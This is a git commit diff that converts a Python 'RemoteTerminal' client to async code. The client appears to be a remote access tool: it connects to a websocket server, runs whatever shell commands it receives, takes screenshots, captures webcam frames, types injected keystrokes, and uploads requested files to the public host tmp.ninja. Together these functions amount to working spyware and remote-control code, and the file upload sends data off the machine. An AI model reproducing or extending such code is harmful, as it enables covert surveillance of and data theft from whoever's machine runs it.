7834bd2c19539ab329f85b54254cde20d0c2789a
tanimsk <sktanim5800@gmail.com>
2022-08-12 12:23:46 +0600

    added aync function

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-from time import sleep
+import asyncio
 from pathlib import Path
 from io import BytesIO
 import base64
@@ -18,13 +18,14 @@ class RemoteTerminal:
         self.commands = [
             'getScreen', 'sendKeys', 'getWebcam', 'getFile', 'cmdList'
         ]
+        self.ws = None
 
-    def exe_cmd(self, cmd) -> dict:
+    async def exe_cmd(self, cmd) -> dict:
         cmd_list = cmd.split(' ')
 
         # Run special commands
         if cmd_list[0] in self.commands:
-            return getattr(self, cmd_list[0])(cmd_list)
+            return await getattr(self, cmd_list[0])(cmd_list)
 
         # Execute terminal commands
         else:
@@ -42,7 +43,7 @@ class RemoteTerminal:
                 }
 
     # --- Return all special commands ---
-    def cmdList(self, *args) -> dict:
+    async def cmdList(self, *args) -> dict:
         cmds = ""
         for cmd in self.commands:
             cmds += f"{cmd}\n"
@@ -51,24 +52,25 @@ class RemoteTerminal:
             'content': cmds
         }
 
-    def conv64(self, img) -> str:
+    async def conv64(self, img) -> str:
         img_file = BytesIO()
         img.save(img_file, format='JPEG')
         img64 = base64.b64encode(img_file.getvalue())
         return img64.decode('utf-8')
 
-    # --- Screen Shot ---
 
-    def getScreen(self, *args) -> dict:
+    # --- Screen Shot ---
+    async def getScreen(self, *args) -> dict:
 
         image = pyautogui.screenshot()
         return {
             'type': 'image',
-            'content': self.conv64(image)
+            'content': await self.conv64(image)
         }
 
+
     # --- Webcam Snap ----
-    def getWebcam(self, *args) -> dict:
+    async def getWebcam(self, *args) -> dict:
         img = cv2.VideoCapture(0)
         ret, frame = img.read()
         retval, buffer = cv2.imencode('.jpg', frame)
@@ -79,14 +81,26 @@ class RemoteTerminal:
         }
 
     # --- Executing keystrokes ---
-    def sendKeys(self, cmds) -> str:
+    '''
+        # for hotkey example: #enter, #shift
+        | for delay in sec example: |10, |7
+    '''
+    async def sendKeys(self, cmds) -> str:
         cmd_args = cmds[1].split(',')
+
+        await self.ws.send(json.dumps({
+            'type': 'wait',
+            'content': 'Please wait ...'
+        }))
+
         for cmd_arg in cmd_args:
             if cmd_arg[0] == '#':
                 pyautogui.press(cmd_arg[1:])
+            elif cmd_arg[0] == '|':
+                await asyncio.sleep(int(cmd_arg[1:]))
             else:
                 pyautogui.write(cmd_arg)
-            sleep(.5)
+            await asyncio.sleep(0.5)
 
         return {
             'type': 'text',
@@ -95,7 +109,7 @@ class RemoteTerminal:
 
 
     # --- Getting the file ---
-    def getFile(self, cmds) -> dict:
+    async def getFile(self, cmds) -> dict:
         filename = cmds[1]
 
         params = {
@@ -105,6 +119,11 @@ class RemoteTerminal:
         files = {
             'files[]': open(filename, 'rb'),
         }
+
+        await self.ws.send(json.dumps({
+            'type': 'wait',
+            'content': 'Uploading File ...'
+        }))
 
         response = requests.post('https://tmp.ninja/upload.php', params=params, files=files)
 
@@ -140,12 +159,13 @@ async def run_terminal():
 
     async with websockets.connect(URL) as websocket:
         await websocket.send('Connected !')
+        term.ws = websocket
         print('Connected !')
 
         while True:
             cmd = await websocket.recv()
             print(cmd)
-            cmd_out = term.exe_cmd(cmd)
+            cmd_out = await term.exe_cmd(cmd)
             print(cmd_out)
             await websocket.send(json.dumps(cmd_out))
 
